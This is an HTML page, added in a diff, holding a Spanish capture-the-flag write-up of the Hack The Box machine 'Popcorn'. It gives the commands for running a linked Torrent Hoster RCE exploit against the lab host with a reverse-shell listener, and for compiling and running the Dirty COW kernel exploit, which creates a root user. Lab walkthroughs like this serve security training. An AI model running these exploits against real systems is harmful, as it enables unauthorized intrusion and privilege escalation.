@@ -1,0 +1,81 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Popcorn HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/popcorn/pasted-20260415163821.png" alt="Popcorn HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Popcorn</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>kernel</span>
+            <span>torrent</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: Fuzzing web para descubrir el servicio Torrent Hoster</li>
+            <li><code>Explotación</code>: Torrent Hoster vulnerable a RCE mediante exploit</li>
+            <li><code>Escalada de Privilegios</code>: Kernel antiguo vulnerable a Dirty COW</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/popcorn/pasted-20260415164327.png" alt="Popcorn HTB" />
+          <img class="writeup-image" src="/writeups/assets/popcorn/pasted-20260415164537.png" alt="Popcorn HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <img class="writeup-image" src="/writeups/assets/popcorn/pasted-20260415165126.png" alt="Popcorn HTB" />
+          <img class="writeup-image" src="/writeups/assets/popcorn/pasted-20260415165139.png" alt="Popcorn HTB" />
+          <p><a href="https://github.com/Anon-Exploiter/exploits">Exploit</a></p>
+          <div class="code-card">
+            <h3>Exploit</h3>
+            <pre><code>python2.7 torrent_hoster_unauthenticated_rce.py --url http://popcorn.htb/torrent/
+# Listener 443</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/popcorn/pasted-20260415165113.png" alt="Popcorn HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <div class="code-card">
+            <h3>Kernel Antiguo Vulnerable</h3>
+            <pre><code>uname -a</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/popcorn/pasted-20260415173616.png" alt="Popcorn HTB" />
+          <img class="writeup-image" src="/writeups/assets/popcorn/pasted-20260415173723.png" alt="Popcorn HTB" />
+          <p><a href="https://www.exploit-db.com/exploits/40839">Exploit</a></p>
+          <div class="code-card">
+            <h3>Crear, compilar y ejecutar dirty.c</h3>
+            <pre><code>nano dirty.c
+gcc -pthread dirty.c -o dirty -lcrypt
+./dirty
+# Crea el usuario firefart:pass123</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/popcorn/pasted-20260415174845.png" alt="Popcorn HTB" />
+          <img class="writeup-image" src="/writeups/assets/popcorn/pasted-20260415174919.png" alt="Popcorn HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>kernel</span>
+            <span>torrent</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
